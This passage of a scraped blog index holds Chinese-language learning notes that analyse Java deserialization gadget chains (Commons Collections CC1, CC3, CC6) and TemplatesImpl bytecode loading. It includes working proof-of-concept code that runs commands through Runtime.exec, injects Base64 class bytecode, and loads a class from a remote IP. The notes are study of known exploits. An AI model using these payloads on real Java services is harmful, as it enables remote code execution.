Base64.getDecoder().decode(\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBAA5UZW1wQ2xhc3MuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABAAlUZW1wQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAABMABAAUAAwAFQABABAAAAACABE=\"); TemplatesImpl templatesobj = new TemplatesImpl(); setFieldValue(templatesobj,\"_bytecodes\",new byte[][]{bytes}); setFieldValue(templatesobj,\"_name\",\"test\"); setFieldValue(templatesobj,\"_tfactory\",new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templatesobj } ) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功加载字节码 ","date":"2022-10-03","objectID":"/cc3/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections3链分析","uri":"/cc3/#cc3"},{"categories":["Java"],"content":"Java字节码 ","date":"2022-10-03","objectID":"/templatesimpl/:0:0","series":null,"tags":null,"title":"[Java安全] Templatesimpl与字节码","uri":"/templatesimpl/#java字节码"},{"categories":["Java"],"content":"URLClassLoader远程加载在前面学习classloader的时候就学习到了URLClassLoader，进行远程加载类 比如我在远程服务器写一个这个类 public class Test { public static void main(String[] args){ try{ Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch(Exception e) { e.printStackTrace(); } } } 然后在服务端远程加载这个类 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class URLClassLoaderTest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL url = new URL(\"http://101.35.98.118:12424/javatest/\"); URLClassLoader cl = new URLClassLoader(new URL[]{url}); Class c = cl.loadClass(\"Test\"); c.newInstance(); } } 正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。 ","date":"2022-10-03","objectID":"/templatesimpl/:0:0","series":null,"tags":null,"title":"[Java安全] Templatesimpl与字节码","uri":"/templatesimpl/#urlclassloader远程加载"},{"categories":["Java"],"content":"defineClass直接加载加载字节码，无论是远程还是本地，最后都会到defineClass，p牛这里画了一个图非常直观 loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类 他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中 但是要注意的是，defineClass调用的时候，类对象不会被初始化，所以如果要使用defineClass来加载类的时候，需要想办法调用构造方法 这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Base64; public class defineClass { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\",String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\"); Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),\"Hello\",code,0,code.length); hello.newInstance(); } } ","date":"2022-10-03","objectID":"/templatesimpl/:0:0","series":null,"tags":null,"title":"[Java安全] Templatesimpl与字节码","uri":"/templatesimpl/#defineclass直接加载"},{"categories":["Java"],"content":"TemlatesImpl加载字节码defineClass因为太底层了，一般开发是不会直接使用他的，但是不代表就没有价值了，比如这个TemlatesImpl里面就用到了defineClass，下面来分析这个利用链 在TemplatesImpl里定义了一个TransletClassLoader，这里面最后一行重写了defineClass方法，而且没有声明定义域，那就是默认default，可以在当前类和同包里被利用 那我们就找TemplatesImpl哪里调用了TransletClassLoader#defineClass()，找引用，发现在TemplatesImpl#defineTransletClasses()调用了，但是这个作用域是private，所以我们再找一下哪里调用了这个 继续找引用，找到个getTransletInstance，还是private 继续找引用，在newTransformer找到唯一的应用，而且newTransFormer是public，可以在外面被调用了 所以链子就出来了 TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses()-\u003e TransletClassLoader#defineClass() 现在我们来构造POC，看看如何把序列化数据放进去执行defineClass，从后往前看，code作为唯一的传输传入 往上走，首先是TransletClassLoader对象的创建，这里的第二个参数需要我们传入不然会报错，只需要创建一个对象传进去就行了 private transient TransformerFactoryImpl _tfactory = null; 这里循环传入，数据来源是_bytecodes[i]，他是私有成员变量，可以控制 但是仅有_bytecode是不行的，这里我们往上走会发现，这里要进去这个方法还有条件，我们必须保证_name不为空，否则就不会进入defineTransletClasses 所以我们需要为TemplatesImpl设定三个值，由于是私有属性，我们需要用到反射setAccessible去设置私有成员变量 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class TemplatesImplTest { public static void main(String[] args) throws Exception { byte[] bytes = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{bytes}); setFieldValue(templates,\"_name\",\"test\"); setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl()); templates.newTransformer(); } //利用反射给私有变量赋值如下 public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 但是我们拿刚刚defineClass的序列化数据直接跑起来发现，他没有执行命令 原因是TemplatesImpl对加载的字节码是有要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类 所以我们需要构造一个继承了AbstractTranslet的类，在他的构造方法里去写我们要执行的代码 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class TempClass extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public TempClass(){ super(); System.out.println(\"Hello TemplatesImpl\"); } } ","date":"2022-10-03","objectID":"/templatesimpl/:0:0","series":null,"tags":null,"title":"[Java安全] Templatesimpl与字节码","uri":"/templatesimpl/#temlatesimpl加载字节码"},{"categories":["Java"],"content":"前言之前我们分析了CC1，从简化版开始学习，再到完整分析CC1，再学习了动态代理和LazyMap的利用链构造，但是都有一个缺陷就是版本限制，只能适用于8u71之前的链子，因为AnnotationInvocationHandler的readObject方法发生了改变，CC6就是为了高版本Java的利用问题 ","date":"2022-10-02","objectID":"/cc6/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#前言"},{"categories":["Java"],"content":"CC6这里我还是跟着p牛的Java安全漫谈来学习，这里p牛是简化了ysoserial的CC6利用链，gadget是这样的 我们从后往前看，可以发现还是走了LazyMap.get()方法，在CC1中，我们是通过动态代理Map，从AnnotationInvocationHandler.readObject调用this.memberValues.entrySet()然后到AnnotationInvocationHandler.invoke()再调用到get方法 而高版本的readObject逻辑已经修改了，不能走这条路了，观察CC6的gadget，这里走了org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() 我们跟进TiedMapEntry去看看，执行了this.map.get(this.key)，我们实例化的时候是可以操控map和key的的 而且他的hashCode方法又执行了this.getValue() public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } // ... public Object getValue() { return this.map.get(this.key); } // ... public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // ... 所以现在的目的就变成了找到哪里调用了TiedMapEntry#hashCode，看到gadget是调用了HashMap.hash()方法这其实就是接上了之前学习的URLDNS链子 在HashMap的readObject中调用了 putVal(hash(key), key, value, false, false) 跟进hash方法，调用了key.hashCode() static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } 所以我们控制key为TiedMapEntry的对象即可 ","date":"2022-10-02","objectID":"/cc6/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#cc6"},{"categories":["Java"],"content":"POC首先是创建好我们的恶意Map Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); 然后就是这次的主角TiedMapEntry登场了，我们需要他的hashCode方法，调用到他的hashCode方法的途径是HashMap的readObject里面的hash(key) 所以我们实例化TiedMapEntry，把恶意的Map传入作为map参数，key是啥无所谓，因为要进ChainedTransformer，然后再把这个TiedMapEntry作为key传入HashMap中，这样就调用到了TiedMapEntry#hashCode() TiedMapEntry tme = new TiedMapEntry(outerMap,\"key\"); HashMap expMap = new HashMap(); expMap.put(tme,\"value\"); ","date":"2022-10-02","objectID":"/cc6/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#poc"},{"categories":["Java"],"content":"注意点1看ysoserial代码可以发现，他构造ChainedTransformer的时候，是这样的，多了一个 new ConstantTransformer(1) 起初我没觉得有什么，后来到了分析CC6的链子的时候，我发现会报错 原因是java.lang.UNIXProcess不能被序列化 这里我调试跟进去看了一下，如果POC和之前一样的话，这里是返回UNIX对象的 因为CC6的最后需要把恶意的代码加进一个新的Map里面去，然后再对这个Map进行序列化，所以这里就会因为UNIXProcess没有基础serializable而触发报错了 所以我们的解决办法就是在后面再加上一个new ConstantTransformer(1)，这样返回的就是可序列化的对象了 ","date":"2022-10-02","objectID":"/cc6/:1:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#注意点1"},{"categories":["Java"],"content":"注意点2链子基本就是这样了，但是有一点要注意的是，如果直接拿expMap去生成序列化数据，是不会RCE的 原因在这，当我们进入LazyMap的get方法的时候，他这个判断条件过不去，不会进入执行factory.transform方法 原因是在构造新的Map的时候，我们执行了一次expMap.put(tme,\"value\");，把恶意数据put进Map中，在执行这个方法的时候会走进LazyMap的get方法，再插入一个数据进去，{\"key\",1} 所以当我们反序列化以后的恶意的outerMap要去执行get的时候，就会因为里面有值而过不了判断执行不了transform 解决办法就是在expMap.put(tme,\"value\");的后面去把outerMap的内容删除即可 最后的POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class CC6 { public static void main(String[] args) throws ClassNotFoundException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap,\"key\"); HashMap expMap = new HashMap(); expMap.put(tme,\"value\"); outerMap.remove(\"key\"); FileOutputStream fileInputStream = new FileOutputStream(new File(\"./1.txt\")); ObjectOutputStream oos = new ObjectOutputStream(fileInputStream); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\"./1.txt\"))); Object o = (Object) ois.readObject(); } } ","date":"2022-10-02","objectID":"/cc6/:2:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#注意点2"},{"categories":["Java"],"content":"注意点3我们在构造序列化对象的时候，由于这里执行了这个，而这个put方法里面会执行hash()，所以就会导致在序列化的时候就会把整个利用链走一遍 expMap.put(tme,\"value\"); 这里看ysoserial有个解决办法，就是构造LazyMap的时候用一个fakeTransformers对象 等到最后生成payload的时候再用反射，getDeclaredField，把真正的恶意transformer换进去 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6pro { public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException { Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), new ConstantTransformer(1) }; // 传入fake防止序列化时执行 Transformer transformerChain = new ChainedTransformer(faketransformer); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap,\"key\"); HashMap expMap = new HashMap(); expMap.put(tme,\"value\"); outerMap.remove(\"key\"); // 到最后生成payload的时候，利用反射把真正的transform换进去 Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // 序列化数据 FileOutputStream fileInputStream = new FileOutputStream(new File(\"./1.txt\")); ObjectOutputStream oos = new ObjectOutputStream(fileInputStream); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\"./1.txt\"))); Object o = (Object) ois.readObject(); } } ","date":"2022-10-02","objectID":"/cc6/:3:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections6链分析","uri":"/cc6/#注意点3"},{"categories":["Java"],"content":"前面写了很多，现在终于到大名鼎鼎的CC链了，这里我还是跟P牛的《Java安全漫谈》来对CC链进行分析学习 ","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#"},{"categories":["Java"],"content":"CommonCollection1","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#commoncollection1"},{"categories":["Java"],"content":"前菜首先P牛帮我们简化CC链成如下代码 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class easycc1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"whoami\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } } ","date":"2022-09-29","objectID":"/cc1/:1:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#前菜"},{"categories":["Java"],"content":"TransformedTransformed是一个接口，他只有一个待实现的方法 package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); } ","date":"2022-09-29","objectID":"/cc1/:1:1","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#transformed"},{"categories":["Java"],"content":"ConstantTransformerConstantTransformer在CommonCollection里，是实现了Transformer接口的一个类 它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回 public class ConstantTransformer implements Transformer, Serializable { static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) { return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); } public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } public Object getConstant() { return this.iConstant; } } 疑问1：这个有啥用，为什么要传入一个对象，然后原封不动的传回来 ","date":"2022-09-29","objectID":"/cc1/:1:2","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#constanttransformer"},{"categories":["Java"],"content":"InvokerTransformerInvokerTransformer也是CommonCollection中实现了Transformer接⼝的⼀个类 他的参数有三个，第一个是待执行的方法名，第二个是这个函数的参数列表的类型，第三个则是传给这个方法的参数 在后面的transform方法中，就执⾏了input对象的iMethodName⽅法 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } 疑问2：其实看到这里，我就在想得怎么去执行这个transform函数，接下来的这个ChainedTransformer就解决了我的疑惑 ","date":"2022-09-29","objectID":"/cc1/:1:3","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#invokertransformer"},{"categories":["Java"],"content":"ChainedTransformerChainedTransformer也是实现了Transformer接⼝的⼀个类，它的transform方法的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，这里p牛画了一个图很直观 实现也很简单，利用构造方法传入一个数组，然后for循环这里，也就是让前一个对象的回调结果作为下一个对象的transform方法的参数，这就解决了我的疑问2 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u003c this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } 这里就解决了我的疑问1，因为在这个ChainedTransformer类里面的transform方法里面，可以让我们进行一个连接，让前一个对象的回调结果作为下一个对象的transform方法的参数，所以我们使用ConstantTransformer来包住我们想要加载的对象，在执行ConstantTransformer的transform后得以作为input传给InvokerTransformer去执行函数method.invoke(input, this.iArgs) 疑问3：那我ChainedTransformer的transform又得怎么执行呢，是由下面介绍的TransformedMap来 ","date":"2022-09-29","objectID":"/cc1/:1:4","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#chainedtransformer"},{"categories":["Java"],"content":"TransformedMapTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时将可以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map： Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); 跟进源码去分析 其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 然后前面说我们对修饰过的Map添加新元素的时候会执行一个回调，在这里也就是一个put函数，我们跟进去看看，这个put方法会对键和值分别执行transformKey和transformValue public Object put(Object key, Object value) { key = this.transformKey(key); value = this.transformValue(value); return this.getMap().put(key, value); } 然后我们再跟进transformValue去看看，可以发现是执行了transform函数的，完成了一次回调 protected Object transformValue(Object object) { return this.valueTransformer == null ? object : this.valueTransformer.transform(object); } ","date":"2022-09-29","objectID":"/cc1/:1:5","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#transformedmap"},{"categories":["Java"],"content":"调试分析介绍完了这几个Transform，接下来就可以来走这个链子了，这里我调试来跟着走一遍 首先创建transformers数组： 第一个是ConstantTransformer对象，传入的是Runtime对象 第二个是InvokerTransformer对象，传入的是执行的exec方法和他的参数 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; 然后是ChainedTransformer，把这个数组传进去，赋值给ChainedTransformer的ITransformers 然后就是TransformedMap.decorate()，先创建一个Map，然后把map传入作为被修饰的Map Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 把我们的ChainedTransformer对象传进去作为处理新元素的value的回调valueTransformer 这样我们的Map就算是被TransformedMap修饰好了，输出outerMap，下一步就是为这个Map插入一个元素去触发我们的ChainedTransformer对象的transform方法 outerMap.put(\"test\", \"xxxx\"); 在更新value的时候，触发valueTransformer也就是我们的ChainedTransformer对象的transform方法 然后就进入到了这个循环 public Object transform(Object object) { for(int i = 0; i \u003c this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } 此时的object是我们传入的新value，就是个随便的字符串对象，而此时的iTransformers[i]是我们前面传入的数组的第一个元素，也就是ConstantTransformer(Runtime.getRuntime())，这里就调用了他的transform函数，不管输入，直接返回之前存在里面的对象 public Object transform(Object input) { return this.iConstant; } 那么此时的object就被赋值为Runtime对象了，然后进入下一层循环，此时iTransformers[i]变成了之前定义的数组的第二个元素 InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) 把Runtime对象传入，执行他的transform函数，完成RCE ","date":"2022-09-29","objectID":"/cc1/:1:6","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#调试分析"},{"categories":["Java"],"content":"CC1前面理解了p牛所做的简易版的CC链，现在就开始进行真正的CC链的分析了 在前面的demo中，我们手动进行了outerMap.put(\"test\", \"xxxx\");去触发的漏洞，但是正常环境中，我们进行反序列化的时候如何触发字典的插入操作呢，我们就得去找到一个类，他重写的readObject进行反序列化的时候会执行这样的写入操作，这个类就是sun.reflect.annotation.AnnotationInvocationHandler ","date":"2022-09-29","objectID":"/cc1/:2:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#cc1"},{"categories":["Java"],"content":"AnnotationInvocationHandler注意我们分析的是8u71以前的代码，这里我jdk用的是8u65，我们直奔他的readObject方法 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026\u0026 !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } } } 核心点在这： memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们前面所展示的链子 Iterator var4 = this.memberValues.entrySet().iterator(); Entry var5 = (Entry)var4.next(); var5.setValue() 所以现在我们就来构造我们的POC ","date":"2022-09-29","objectID":"/cc1/:2:1","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#annotationinvocationhandler"},{"categories":["Java"],"content":"POC构造首先就是AnnotationInvocationHandler对象的创建，因为这个是jdk内部的类，是不能直接new获取的，所以得用反射来获取 Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); 